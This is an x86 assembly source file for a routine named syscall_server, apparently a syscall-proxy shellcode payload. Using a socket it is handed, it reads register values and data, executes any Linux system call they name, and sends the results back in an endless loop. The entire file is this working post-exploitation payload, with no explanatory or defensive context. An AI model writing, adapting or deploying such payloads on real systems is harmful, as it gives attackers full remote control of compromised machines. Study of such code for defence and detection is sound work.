#include <asm/unistd.h>

.globl syscall_server
.globl syscall_server_end

# %ebx == sock

syscall_server:
mov $0xff,%eax
sub %eax,%esp		/* make room on the stack */
xor %eax,%eax
xor %edx,%edx

read_len:		/* read data len */
mov $__NR_read,%al
mov %esp,%ecx
mov $0x4,%dl
int $0x80

mov (%esp),%edi
sub %edi,%esp		/* char buf[len] C99 style */
mov %edi,-0x4(%esp)

send_esp:		/* send esp */
mov $__NR_write,%al
mov %esp,(%esp)
mov %esp,%ecx
int $0x80

mov -0x4(%esp),%edx

read_data:		/* read regs and data */
mov $__NR_read,%al
int $0x80
add %eax,%ecx
sub %eax,%edx
jnz read_data

mov %ebx,-0x8(%esp)

do_syscall: 		/* exec syscall */
pop %eax
pop %ebx
pop %ecx
pop %edx
pop %esi
pop %edi
int $0x80
sub $0x14,%esp		/* only save eax aka return value */
push %eax

xor %eax,%eax
mov -0x8(%esp),%ebx
mov %esp,%ecx
mov -0x4(%esp),%edx

send_back:		/* send back regs and data */
mov $__NR_write,%al
int $0x80
add %eax,%ecx
sub %eax,%edx
jnz send_back

xor %eax,%eax
cdq
jmp read_len

syscall_server_end:
